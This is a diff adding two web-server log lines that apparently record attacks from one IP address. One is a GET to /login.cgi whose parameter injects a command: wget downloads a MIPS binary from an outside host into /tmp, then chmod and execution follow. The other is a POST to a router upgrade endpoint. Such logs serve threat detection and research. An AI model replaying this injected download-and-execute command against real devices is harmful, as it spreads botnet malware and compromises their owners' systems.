@@ -1,0 +1,2 @@
+177.184.157.207 - - [30/Mar/2020:12:13:31 +0300] "GET /login.cgi?cli=aa%20aa%27;wget%20http://45.148.10.94/luoqxbocmkxnexy/tbox.mips%20-O%20->%20/tmp/leonn;chmod%20777%20/tmp/leonn;/tmp/leonn%20dlink.mips%27$ HTTP/1.1" 400 150 "-" "-" "tbox/2.0"
+177.184.157.207 - - [31/Mar/2020:08:10:53 +0300] "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" 400 150 "-" "-" "-"
